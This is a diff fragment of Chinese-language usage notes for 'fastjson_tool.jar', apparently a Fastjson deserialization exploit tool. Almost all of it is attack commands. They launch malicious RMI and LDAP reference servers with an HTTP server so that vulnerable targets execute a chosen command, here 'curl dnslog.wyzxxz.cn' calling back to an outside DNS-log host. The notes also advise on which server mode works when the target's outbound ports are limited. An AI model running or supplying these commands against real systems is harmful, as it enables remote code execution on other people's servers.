@@ -9,7 +9,7 @@ java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
 或
 java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-:使用 LDAPRefServer3 创建一个LDAP服务和一个HTTP服务，1099为ldap/rmi服务的端口, 127.0.0.1为机器外网IP地址，8888为http的端口，后面写要执行的命令。
+:创建一个LDAP/RMI服务和一个HTTP服务，1099为ldap/rmi服务的端口, 127.0.0.1为机器外网IP地址，8888为http的端口，后面写要执行的命令。
 使用ldap服务的话，最推荐使用这个，前提是目标机器可以有最少2个端口出来。
 
 3. 启动LDAP服务2
